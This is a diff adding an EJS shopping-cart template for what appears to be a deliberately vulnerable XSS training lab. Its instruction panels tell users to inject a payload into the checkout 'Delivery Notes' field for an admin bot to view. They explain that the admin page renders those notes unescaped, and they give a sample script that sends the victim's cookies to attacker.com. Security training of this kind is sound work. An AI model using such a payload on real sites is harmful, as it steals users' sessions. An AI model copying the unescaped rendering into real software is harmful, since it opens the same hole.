@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopping Cart - ElectroStore</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <%- include('partials/header', { user: user, cart: cart }) %>
+
+    <main class="main-content">
+        <div class="container">
+            <% if (typeof message !== 'undefined' && message) { %>
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle"></i> <%= message %>
+                </div>
+            <% } %>
+            
+            <% if (typeof error !== 'undefined' && error) { %>
+                <div class="alert alert-error">
+                    <i class="fas fa-exclamation-triangle"></i> <%= error %>
+                </div>
+            <% } %>
+
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1><i class="fas fa-shopping-cart"></i> Shopping Cart</h1>
+                <div>
+                    <a href="/products" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> Continue Shopping
+                    </a>
+                </div>
+            </div>
+
+            <% if (cart && cart.length > 0) { %>
+                <div class="card mb-4">
+                    <div class="card-body">
+                        <div class="table-responsive">
+                            <table class="table">
+                                <thead>
+                                    <tr>
+                                        <th>Product</th>
+                                        <th>Price</th>
+                                        <th>Quantity</th>
+                                        <th>Total</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <% cart.forEach(item => { %>
+                                        <tr>
+                                            <td>
+                                                <div class="d-flex align-items-center gap-2">
+                                                    <div class="cart-item-image">
+                                                        <i class="fas fa-box"></i>
+                                                    </div>
+                                                    <div>
+                                                        <strong><%= item.name %></strong>
+                                                        <p class="text-muted mb-0"><%= item.description %></p>
+                                                    </div>
+                                                </div>
+                                            </td>
+                                            <td>$<%= item.price ? item.price.toFixed(2) : '0.00' %></td>
+                                            <td>
+                                                <form action="/cart/update" method="POST" class="d-flex gap-1">
+                                                    <input type="hidden" name="productId" value="<%= item.id %>">
+                                                    <input 
+                                                        type="number" 
+                                                        name="quantity" 
+                                                        class="form-control" 
+                                                        value="<%= item.quantity %>" 
+                                                        min="1" 
+                                                        max="<%= item.stock %>"
+                                                        style="width: 80px;"
+                                                    >
+                                                    <button type="submit" class="btn btn-sm btn-primary">
+                                                        <i class="fas fa-sync-alt"></i>
+                                                    </button>
+                                                </form>
+                                            </td>
+                                            <td>$<%= item.price ? (item.price * item.quantity).toFixed(2) : '0.00' %></td>
+                                            <td>
+                                                <form action="/cart/remove" method="POST" style="display: inline;">
+                                                    <input type="hidden" name="productId" value="<%= item.id %>">
+                                                    <button type="submit" class="btn btn-sm btn-danger">
+                                                        <i class="fas fa-trash"></i> Remove
+                                                    </button>
+                                                </form>
+                                            </td>
+                                        </tr>
+                                    <% }) %>
+                                </tbody>
+                                <tfoot>
+                                    <tr>
+                                        <td colspan="3" class="text-end"><strong>Total:</strong></td>
+                                        <td><strong>$<%= cart.reduce((sum, item) => sum + ((item.price || 0) * (item.quantity || 0)), 0).toFixed(2) %></strong></td>
+                                        <td></td>
+                                    </tr>
+                                </tfoot>
+                            </table>
+                        </div>
+                        
+                        <div class="d-flex justify-content-between mt-4">
+                            <a href="/products" class="btn btn-secondary">
+                                <i class="fas fa-arrow-left"></i> Continue Shopping
+                            </a>
+                            <a href="/checkout" class="btn btn-primary">
+                                <i class="fas fa-credit-card"></i> Proceed to Checkout
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">
+                            <i class="fas fa-graduation-cap"></i> XSS Lab Instructions
+                        </h3>
+                    </div>
+                    <div class="card-body">
+                        <h4>Next Steps for XSS Practice:</h4>
+                        <ol>
+                            <li><strong>Proceed to Checkout</strong> to enter shipping details</li>
+                            <li><strong>Inject XSS payload</strong> in the "Delivery Notes" field</li>
+                            <li><strong>Wait for admin bot</strong> to view your order (runs every 60 seconds)</li>
+                            <li><strong>Monitor payload execution</strong> (e.g., using a request bin)</li>
+                        </ol>
+                        
+                        <div class="xss-warning mt-3">
+                            <h4>
+                                <i class="fas fa-exclamation-triangle"></i> XSS Vulnerability Location
+                            </h4>
+                            <p>The admin order details page renders delivery notes using <code><%- %></code> (unescaped output) instead of <code><%= %></code> (escaped output).</p>
+                            <p><strong>Sample payload:</strong> <code><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></code></p>
+                        </div>
+                    </div>
+                </div>
+            <% } else { %>
+                <div class="card">
+                    <div class="card-body text-center p-5">
+                        <i class="fas fa-shopping-cart fa-4x text-muted mb-4"></i>
+                        <h3>Your cart is empty</h3>
+                        <p class="text-muted mb-4">Add some products to your cart to practice XSS injection.</p>
+                        <a href="/products" class="btn btn-primary">
+                            <i class="fas fa-store"></i> Browse Products
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="card mt-4">
+                    <div class="card-header">
+                        <h3 class="card-title">
+                            <i class="fas fa-graduation-cap"></i> How to Practice XSS
+                        </h3>
+                    </div>
+                    <div class="card-body">
+                        <div class="row" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">
+                            <div>
+                                <h4><i class="fas fa-shopping-cart"></i> Step 1: Add to Cart</h4>
+                                <p>Browse products and add items to your shopping cart.</p>
+                            </div>
+                            <div>
+                                <h4><i class="fas fa-credit-card"></i> Step 2: Checkout</h4>
+                                <p>Proceed to checkout and fill in shipping details.</p>
+                            </div>
+                            <div>
+                                <h4><i class="fas fa-bug"></i> Step 3: Inject Payload</h4>
+                                <p>Enter XSS payload in "Delivery Notes" field during checkout.</p>
+                            </div>
+                            <div>
+                                <h4><i class="fas fa-robot"></i> Step 4: Wait for Bot</h4>
+                                <p>Admin bot automatically views new orders every 60 seconds.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            <% } %>
+        </div>
+    </main>
+
+    <%- include('partials/footer') %>
+
+    <script src="/js/main.js"></script>
+</body>
+</html>
